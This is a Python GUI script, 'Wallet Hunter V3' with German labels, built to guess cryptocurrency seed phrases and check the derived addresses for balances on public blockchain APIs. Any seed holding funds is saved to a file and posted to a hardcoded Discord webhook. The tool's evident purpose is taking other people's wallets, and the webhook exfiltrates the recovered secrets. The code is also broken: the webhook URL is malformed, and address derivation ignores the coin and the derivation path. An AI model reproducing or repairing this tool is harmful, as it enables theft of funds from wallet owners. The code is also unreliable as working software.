import random 
import threading
import time
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
from mnemonic import Mnemonic
from bip32utils import BIP32Key
import requests
from PIL import Image, ImageTk

# === DISCORD WEBHOOK HIER EINFÜGEN ===
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1363639314709352679/F-I28D7-4DMIyTe1QmSAZh1pGn2iM1uoxWGFb7q8Cp-rzD3YXXgmFdQSY-JwQpUcCg1n"

common_words = [
    'love', 'money', 'future', 'happy', 'life', 'trust', 'dream', 'baby',
    'moon', 'crypto', 'magic', 'secret', 'peace', 'success', 'secure',
    'light', 'sun', 'world', 'power', 'strong', 'wallet', 'bitcoin', 'hope'
]

finance = ['money', 'wealth', 'invest', 'market', 'cash', 'bank']
emotions = ['love', 'happy', 'trust', 'hope', 'peace', 'freedom']
tech = ['crypto', 'wallet', 'block', 'secure', 'bitcoin', 'token']
nature = ['sun', 'moon', 'light', 'wind', 'earth', 'ocean']
personal = ['baby', 'life', 'home', 'future', 'dream', 'family']
clusters = [finance, emotions, tech, nature, personal]

mnemo = Mnemonic("english")
wordlist = mnemo.wordlist

running = False
wallets_checked = 0
wallets_found = 0
start_time = 0
lock = threading.Lock()
wordlist_words = []
seen_seeds = set()

derivation_paths = [f"m/44'/{coin}'/0'/0/{i}" for coin in range(0, 61) for i in range(0, 10)]

supported_currencies = {
    "btc": {"color": "orange"},
    "eth": {"color": "blue"},
    "sol": {"color": "green"},
    "ltc": {"color": "gray"},
    "doge": {"color": "brown"},
    "bch": {"color": "darkgreen"}
}

def generate_seed(mode):
    if mode == "ai":
        patterns = [
            lambda: ' '.join(random.sample(common_words, 12)),
            lambda: ' '.join([
                random.choice(['money', 'love', 'baby', 'future']),
                random.choice(['trust', 'wallet', 'secure']),
                random.choice(['life', 'dream', 'hope']),
                random.choice(['sun', 'moon', 'light']),
                random.choice(wordlist),
                random.choice(wordlist),
                random.choice(common_words),
                random.choice(wordlist),
                random.choice(['magic', 'peace', 'strong']),
                random.choice(['success', 'power', 'world']),
                random.choice(['hope', 'trust', 'crypto']),
                random.choice(wordlist)
            ]),
            lambda: ' '.join([random.choice(random.choice(clusters)) if random.random() < 0.75 else random.choice(wordlist) for _ in range(12)]),
            lambda: ' '.join(random.choices(wordlist, k=12))
        ]
        return random.choice(patterns)()
    elif mode == "wordlist" and len(wordlist_words) >= 12:
        return ' '.join(random.choices(wordlist_words, k=12))
    return ""

def seed_to_address(seed_phrase, currency):
    seed = mnemo.to_seed(seed_phrase)
    key = BIP32Key.fromEntropy(seed)
    return key.Address()

def check_balance(address, currency):
    try:
        if currency == "btc":
            url = f"https://blockstream.info/api/address/{address}"
            r = requests.get(url)
            data = r.json()
            return data.get("chain_stats", {}).get("funded_txo_sum", 0) / 1e8
        elif currency == "eth":
            url = f"https://api.blockchair.com/ethereum/dashboards/address/{address}"
            r = requests.get(url)
            data = r.json()
            return float(data["data"][address]["address"]["balance"]) / 1e18
        elif currency == "sol":
            url = "https://api.mainnet-beta.solana.com"
            headers = {"Content-Type": "application/json"}
            payload = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [address]}
            r = requests.post(url, headers=headers, json=payload)
            return r.json()["result"]["value"] / 1e9
        elif currency == "ltc":
            url = f"https://api.blockcypher.com/v1/ltc/main/addrs/{address}/balance"
            r = requests.get(url)
            return r.json().get("final_balance", 0) / 1e8
        elif currency == "doge":
            url = f"https://sochain.com/api/v2/get_address_balance/DOGE/{address}"
            r = requests.get(url)
            return float(r.json()["data"]["confirmed_balance"])
        elif currency == "bch":
            url = f"https://rest.bitcoin.com/v2/address/details/{address}"
            r = requests.get(url)
            return float(r.json().get("balance", 0))
    except:
        return 0.0

def send_to_discord(message):
    try:
        payload = {"content": message}
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"[Discord Fehler] {e}")

def start_threads(output_box, counter_label, selected_currencies, mode_var):
    def check_wallet(currency):
        global running, wallets_checked, wallets_found

        while running:
            seed = generate_seed(mode_var.get())
            if not seed or seed in seen_seeds:
                continue
            seen_seeds.add(seed)

            for path in derivation_paths:
                address = seed_to_address(seed, currency)
                balance = check_balance(address, currency)

                with lock:
                    wallets_checked += 1
                    counter_label.config(
                        text=f"Gecheckt: {wallets_checked} | Gefunden: {wallets_found} | Speed: {wallets_checked // max(1, (int(time.time()) - start_time))} addr/sec"
                    )

                log_line = f"{currency.upper()} | {balance:.9f} {currency} | {address}\nSeed: {seed}\nPfad: {path}\n{'-'*60}\n"

                output_box.configure(state='normal')
                output_box.insert(tk.END, log_line, currency)
                output_box.configure(state='disabled')
                output_box.see(tk.END)

                if balance > 0.000000001:
                    wallets_found += 1
                    with open("found.txt", "a") as f:
                        f.write(log_line)
                    send_to_discord(f"💸 WALLET GEFUNDEN!\n{log_line}")

    for currency in selected_currencies:
        for _ in range(10):
            t = threading.Thread(target=check_wallet, args=(currency,), daemon=True)
            t.start()

def start_gui():
    global running, wallets_checked, wallets_found, start_time, wordlist_words

    root = tk.Tk()
    root.title("💸 Wallet Hunter V3 – Discord + Datei")
    root.geometry("1050x740")

    counter_label = tk.Label(root, text="Gecheckt: 0", font=("Arial", 12, "bold"))
    counter_label.pack(pady=5)

    top_frame = tk.Frame(root)
    top_frame.pack(pady=10)

    currency_vars = {c: tk.BooleanVar(value=(c in ['btc', 'eth', 'sol'])) for c in supported_currencies}

    tk.Label(top_frame, text="Währungen:").pack(side=tk.LEFT, padx=5)

    icons = {}
    for cur in supported_currencies:
        try:
            img = Image.open(f"icons/{cur}.png").resize((20, 20), Image.ANTIALIAS)
            icons[cur] = ImageTk.PhotoImage(img)
            cb = tk.Checkbutton(top_frame, text=cur.upper(), image=icons[cur], compound=tk.LEFT, variable=currency_vars[cur])
        except:
            cb = tk.Checkbutton(top_frame, text=cur.upper(), variable=currency_vars[cur])
        cb.pack(side=tk.LEFT, padx=3)

    mode_var = tk.StringVar(value="ai")
    mode_frame = tk.Frame(root)
    mode_frame.pack(pady=5)

    tk.Label(mode_frame, text="Modus:").pack(side=tk.LEFT, padx=5)
    tk.Radiobutton(mode_frame, text="AI Generator", variable=mode_var, value="ai").pack(side=tk.LEFT)
    tk.Radiobutton(mode_frame, text="Wordlist", variable=mode_var, value="wordlist").pack(side=tk.LEFT)

    def load_wordlist():
        file_path = filedialog.askopenfilename(title="Wordlist Datei auswählen", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'r') as f:
                words = f.read().splitlines()
                wordlist_words = [w.strip() for w in words if len(w.strip()) > 0]
                if len(wordlist_words) < 12:
                    messagebox.showwarning("Fehler", "Mindestens 12 Wörter nötig!")
                    return
                globals()["wordlist_words"] = wordlist_words
                messagebox.showinfo("Wordlist geladen", f"{len(wordlist_words)} Wörter geladen.")

    tk.Button(mode_frame, text="Wordlist laden", command=load_wordlist).pack(side=tk.LEFT, padx=10)

    button_frame = tk.Frame(root)
    button_frame.pack(pady=10)

    output_box = scrolledtext.ScrolledText(root, state='disabled', wrap='word', font=('Courier', 10))
    output_box.pack(expand=True, fill='both', padx=10, pady=10)

    for cur in supported_currencies:
        output_box.tag_config(cur, foreground=supported_currencies[cur]["color"])

    def on_start():
        global running, wallets_checked, wallets_found, start_time
        if not running:
            running = True
            wallets_checked = 0
            wallets_found = 0
            start_time = int(time.time())
            counter_label.config(text="Gecheckt: 0")
            selected = [cur for cur, var in currency_vars.items() if var.get()]
            start_threads(output_box, counter_label, selected, mode_var)

    def on_stop():
        global running
        running = False

    tk.Button(button_frame, text="Start", bg="green", fg="white", command=on_start).pack(side=tk.LEFT, padx=10)
    tk.Button(button_frame, text="Stop", bg="red", fg="white", command=on_stop).pack(side=tk.LEFT, padx=10)

    root.mainloop()

if __name__ == "__main__":
    start_gui()
